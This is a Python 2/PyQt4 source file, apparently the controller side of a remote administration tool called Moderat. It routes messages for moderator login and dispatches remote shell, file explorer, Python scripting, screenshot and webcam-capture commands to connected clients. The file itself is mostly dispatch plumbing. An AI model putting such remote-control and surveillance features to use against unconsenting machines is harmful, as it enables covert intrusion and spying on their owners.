from PyQt4.QtGui import *
from PyQt4.QtCore import *
import os

from libs.language import Translate
from libs.gui import tables, main


# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class Modes:

    def __init__(self, moderat):
        self.moderat = moderat

        # Create Main UI Functions
        self.ui = main.updateUi(self.moderat)

        # Create Tables UI
        self.tables = tables.updateClientsTable(self.moderat)

        # Init Modes
        self.modes = {
            'moderatorInitializing': self.moderatorInitializing,
            'getClients': self.getClients,
            'getModerators': self.getModerators,
            'shellMode': self.shellMode,
            'explorerMode': self.explorerMode,
            'scriptingMode': self.scriptingMode,
            'getScreen': self.getScreen,
            'getWebcam': self.getWebcam,
        }

    def check_mode(self, data):
        if type(data) is dict:
            if self.modes.has_key(data['mode']):
                self.modes[data['mode']](data)
            else:
                print 'UNKNOWN MODE [%s]' % data['mode']

    # Moderator Login Callback
    def moderatorInitializing(self, data):
        '''
        Initializing Moderator
        :param data:
        :return:
        '''
        if data['payload'].startswith('loginSuccess '):
            # Get Privileges
            self.moderat.privs = int(data['payload'].split()[-1])
            if self.moderat.privs == 1: self.ui.enable_administrator()
            else: self.ui.disable_administrator()
            # Start Client Checker
            self.moderat.clients_checker = QTimer()
            self.moderat.clients_checker.timeout.connect(self.moderat.check_clients)
            self.moderat.clients_checker.start(500)
            # Start Moderator Checker
            #self.moderat.moderators_checker = QTimer()
            #self.moderat.moderators_checker.timeout.connect(self.moderat.check_moderators)
            #self.moderat.moderators_checker.start(500)

            # Update UI
            self.ui.on_moderator_connected()
        else:
            # Update UI
            self.ui.on_moderator_not_connected()
            # Warn Message
            warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
            ans = warn.exec_()

    def shellMode(self, data):
        '''
        Remote Shell Commands
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def explorerMode(self, data):
        '''
        Remote File Explorer
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def scriptingMode(self, data):
        '''
        Remote Python Scripting
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def getScreen(self, data):
        '''
        Get Desktop Screenshot
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def getWebcam(self, data):
        '''
        Get Webcamera Capture
        :param data:
        :return:
        '''
        self.moderat.send_signal(data)

    def getClients(self, data):
        '''
        Update Clients Information
        :param data:
        :return:
        '''
        self.tables.update_clients(data)

    # Administrators Modes
    def getModerators(self, data):
        '''
        Update Moderators Information
        :param data:
        :return:
        '''
        self.tables.update_moderators(data)